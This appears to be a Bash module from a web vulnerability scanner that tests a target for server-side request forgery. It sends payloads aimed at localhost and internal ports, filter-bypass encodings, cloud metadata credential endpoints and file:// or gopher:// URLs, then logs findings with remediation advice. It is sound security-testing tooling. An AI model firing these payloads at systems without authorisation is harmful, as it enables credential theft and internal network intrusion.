#!/bin/bash

# SSRF (Server-Side Request Forgery) Testing Module
# Tests for SSRF vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main SSRF testing function
test_ssrf() {
    local url=$1
    local project_id=$2

    log_info "Testing SSRF vulnerabilities on $url"

    # Test internal network access
    test_ssrf_internal "$url" "$project_id"

    # Test cloud metadata access
    test_ssrf_cloud_metadata "$url" "$project_id"

    # Test protocol smuggling
    test_ssrf_protocols "$url" "$project_id"
}

# Test SSRF to internal network
test_ssrf_internal() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing internal network access"

    # Internal target payloads
    local ssrf_payloads=(
        # Localhost variants
        "http://localhost"
        "http://127.0.0.1"
        "http://127.0.0.1:80"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "http://127.0.0.1:5432"
        "http://127.0.0.1:6379"
        "http://127.0.0.1:27017"
        "http://127.1"
        "http://0.0.0.0"
        "http://[::1]"
        "http://[::]"
        # Private IP ranges
        "http://192.168.1.1"
        "http://192.168.0.1"
        "http://10.0.0.1"
        "http://172.16.0.1"
        # Bypass filters
        "http://127.1"
        "http://127.0.1"
        "http://2130706433"  # Decimal form of 127.0.0.1
        "http://0x7f000001"  # Hex form of 127.0.0.1
        "http://localhost.me"
        "http://spoofed.burpcollaborator.net"
        # URL encoding
        "http://127.0.0.1%23.example.com"
        "http://example.com#@127.0.0.1"
        # DNS rebinding
        "http://1ocalhost"
        "http://127.0.0.1.nip.io"
    )

    # Parameters likely to be vulnerable
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "path" "dest" "destination" "redirect" "site" "html" "feed" "host" "page" "val" "validate" "domain" "callback" "return" "continue" "view" "proxy")
        for param in "${common_params[@]}"; do
            test_ssrf_parameter "$url" "$param" "$project_id" "${ssrf_payloads[@]}"
        done
    else
        while read -r param; do
            test_ssrf_parameter "$url" "$param" "$project_id" "${ssrf_payloads[@]}"
        done <<< "$params"
    fi
}

# Test SSRF on specific parameter
test_ssrf_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[SSRF] Testing parameter: $param"

    # Get baseline
    local baseline_url=$(build_test_url "$url" "$param" "http://example.com")
    local baseline_response=$(curl -s -L --max-time 10 "$baseline_url" 2>/dev/null)
    local baseline_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 "$baseline_url" 2>/dev/null)

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        log_debug "[SSRF] Testing: $payload"

        local start=$(date +%s)
        local response=$(curl -s -L --max-time 10 -w "\n---HTTP_CODE:%{http_code}---" "$test_url" 2>/dev/null)
        local end=$(date +%s)

        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local code=$(echo "$response" | grep -oP '---HTTP_CODE:\K\d+')

        # Check for successful internal access
        if [ "$code" = "200" ] && [ -n "$body" ]; then
            # Check for localhost indicators
            if echo "$payload" | grep -qE "127\.0\.0\.1|localhost|\[::1\]" && echo "$body" | grep -qiE "apache|nginx|iis|server|dashboard|admin|login|index of|directory listing"; then
                log_critical "[SSRF] SSRF vulnerability found in parameter '$param' - localhost access!"

                db_add_finding "$project_id" "critical" "ssrf_localhost" \
                    "SSRF - Server-Side Request Forgery to Localhost" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed localhost services.\n\nResponse indicates web server or service running on localhost." \
                    "" "9.1" \
                    "CRITICAL:\n1. Validate and whitelist allowed URLs/domains\n2. Disable redirects or validate redirect targets\n3. Use network segmentation\n4. Block requests to private IP ranges\n5. Implement egress filtering\n6. Use URL parsing libraries carefully\n7. Validate URL scheme (allow only http/https)\n8. Block metadata endpoints"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi

            # Check for internal service responses
            if echo "$payload" | grep -qE ":22|:3306|:5432|:6379|:27017"; then
                local port=$(echo "$payload" | grep -oP ':\K\d+')
                log_critical "[SSRF] SSRF to internal service detected - port $port accessible!"

                db_add_finding "$project_id" "critical" "ssrf_internal_service" \
                    "SSRF - Access to Internal Services" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\nPort: $port\n\nInternal services are accessible via SSRF.\n\nThis may expose databases, Redis, MongoDB, or other internal services." \
                    "" "9.3" \
                    "CRITICAL:\n1. Block SSRF vulnerability\n2. Implement strict URL validation\n3. Use network segmentation\n4. Restrict outbound connections\n5. Monitor for internal port scanning"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi

            # Check for private IP access
            if echo "$payload" | grep -qE "192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\."; then
                log_critical "[SSRF] SSRF to private IP range detected!"

                db_add_finding "$project_id" "high" "ssrf_private_ip" \
                    "SSRF - Access to Private IP Ranges" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed private IP address ranges.\n\nThis allows network scanning and access to internal resources." \
                    "" "8.6" \
                    "1. Block requests to private IP ranges\n2. Implement URL validation\n3. Use DNS resolution checks\n4. Whitelist allowed domains"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi
        fi

        # Check for timing-based detection (port scanning)
        local response_time=$((end - start))
        if [ $response_time -ge 8 ] && echo "$payload" | grep -qE "127\.0\.0\.1:[0-9]+"; then
            log_warn "[SSRF] Possible internal port scanning capability detected"
        fi
    done

    return 1
}

# Test cloud metadata access
test_ssrf_cloud_metadata() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing cloud metadata access"

    # Cloud metadata endpoints
    local metadata_payloads=(
        # AWS
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://169.254.169.254/latest/user-data/"
        "http://169.254.169.254/latest/dynamic/instance-identity/"
        # AWS IMDSv2 (requires token, but worth trying)
        "http://169.254.169.254/latest/api/token"
        # Google Cloud
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://metadata.google.internal/computeMetadata/v1/instance/"
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        "http://metadata/computeMetadata/v1/"
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        # Digital Ocean
        "http://169.254.169.254/metadata/v1/"
        "http://169.254.169.254/metadata/v1/user-data"
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/"
    )

    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "redirect" "feed")
        for param in "${common_params[@]}"; do
            test_metadata_parameter "$url" "$param" "$project_id" "${metadata_payloads[@]}"
        done
    else
        while read -r param; do
            test_metadata_parameter "$url" "$param" "$project_id" "${metadata_payloads[@]}"
        done <<< "$params"
    fi
}

# Test metadata access on parameter
test_metadata_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for AWS metadata
        if echo "$payload" | grep -q "169.254.169.254" && echo "$response" | grep -qiE "ami-id|instance-id|security-credentials|iam|role"; then
            log_critical "[SSRF] AWS metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_aws_metadata" \
                "SSRF - AWS Metadata Service Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed AWS EC2 metadata service!\n\nThis may expose IAM credentials and sensitive instance information." \
                "" "9.9" \
                "CRITICAL - IMMEDIATE ACTION:\n1. Fix SSRF vulnerability immediately\n2. Review IAM roles attached to instance\n3. Rotate credentials\n4. Check CloudTrail logs for unauthorized access\n5. Consider using IMDSv2 (requires token)\n6. Block 169.254.169.254 in application firewall"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for Google Cloud metadata
        if echo "$payload" | grep -q "metadata.google.internal" && echo "$response" | grep -qiE "project-id|instance|service-accounts|token"; then
            log_critical "[SSRF] Google Cloud metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_gcp_metadata" \
                "SSRF - Google Cloud Metadata Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nAccessed Google Cloud metadata service!\n\nMay expose service account tokens and credentials." \
                "" "9.9" \
                "CRITICAL:\n1. Fix SSRF immediately\n2. Rotate service account keys\n3. Review GCP audit logs\n4. Block metadata endpoint\n5. Require Metadata-Flavor header"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for Azure metadata
        if echo "$payload" | grep -q "azure" && echo "$response" | grep -qiE "compute|network|access_token|subscription"; then
            log_critical "[SSRF] Azure metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_azure_metadata" \
                "SSRF - Azure Metadata Service Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nAccessed Azure Instance Metadata Service!" \
                "" "9.9" \
                "CRITICAL:\n1. Fix SSRF\n2. Review Azure Activity Log\n3. Rotate managed identity credentials\n4. Block metadata endpoint"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi
    done

    return 1
}

# Test protocol smuggling
test_ssrf_protocols() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing protocol smuggling"

    local protocol_payloads=(
        "file:///etc/passwd"
        "file:///c:/windows/win.ini"
        "gopher://127.0.0.1:25/_HELO%20test"
        "dict://127.0.0.1:11211/stats"
        "ftp://127.0.0.1"
        "sftp://127.0.0.1"
        "tftp://127.0.0.1"
        "ldap://127.0.0.1"
    )

    local params=$(extract_url_parameters "$url")
    [ -z "$params" ] && params="url"

    while read -r param; do
        for payload in "${protocol_payloads[@]}"; do
            local test_url=$(build_test_url "$url" "$param" "$payload")
            local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

            if [ -n "$response" ] && [ ${#response} -gt 50 ]; then
                if echo "$payload" | grep -q "file://" && echo "$response" | grep -qE "root:|administrator"; then
                    log_critical "[SSRF] File protocol SSRF detected!"

                    db_add_finding "$project_id" "critical" "ssrf_file_protocol" \
                        "SSRF - File Protocol Access" \
                        "URL: $test_url\nParameter: $param\nPayload: $payload\n\nfile:// protocol is accessible via SSRF!" \
                        "" "9.5" \
                        "CRITICAL:\n1. Whitelist allowed protocols (http/https only)\n2. Block file://, gopher://, dict://, etc.\n3. Implement URL validation"

                    save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
                    return 0
                fi
            fi
        done
    done <<< "$params"
}

# Helper functions
build_test_url() {
    local url=$1
    local param=$2
    local value=$3
    local encoded_value=$(urlencode "$value")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s|\([?&]${param}=\)[^&]*|\1${encoded_value}|"
        else
            echo "${url}&${param}=${encoded_value}"
        fi
    else
        echo "${url}?${param}=${encoded_value}"
    fi
}

extract_url_parameters() {
    local url=$1
    [[ "$url" != *"?"* ]] && return 1
    echo "${url#*\?}" | tr '&' '\n' | cut -d= -f1
}

urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "$encoded"
}

save_ssrf_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/ssrf"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/ssrf_${timestamp}.txt" <<EOF
SSRF Evidence
URL: $url
Payload: $payload
Captured: $(date)

Response (first 3000 chars):
${response:0:3000}
EOF
}

export -f test_ssrf
export -f test_ssrf_internal
export -f test_ssrf_cloud_metadata
export -f test_ssrf_protocols
